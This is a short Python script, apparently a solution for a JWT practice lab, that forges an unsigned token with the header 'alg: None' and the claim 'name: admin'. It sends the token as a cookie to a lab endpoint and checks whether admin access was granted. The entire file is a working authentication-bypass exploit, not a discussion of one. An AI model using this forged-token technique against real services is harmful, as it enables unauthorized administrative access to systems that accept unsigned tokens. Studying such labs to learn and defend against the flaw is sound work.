#!/usr/bin/python3

import requests
import sys
import jwt
import base64

def jwt_handle():
    none_head = b'{"alg": "None"}'
    admin_payload = b'{"name": "admin"}'

    none_head_b64encode = base64.b64encode(none_head)
    admin_payload_b64encode = base64.b64encode(admin_payload)
    new_admin_jwt_token = none_head_b64encode.decode("utf-8") + "." + admin_payload_b64encode.decode("utf-8") + "."

    return new_admin_jwt_token

def admin_login(new_admin_jwt_token, url, endpoint):

    cookies = {
        "challenge": new_admin_jwt_token,
    }

    r = requests.get(url + endpoint, cookies=cookies)
    if "admin" in r.text:
        print("[INFO] Successfully login as admin")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)

if __name__ == '__main__':
    url = "https://jwt-lab.herokuapp.com"
    endpoint = "/authentication/none"

    new_admin_jwt_token = jwt_handle()
    print(f"[INFO] New JWT Token (None): {new_admin_jwt_token}")

    admin_login(new_admin_jwt_token, url, endpoint)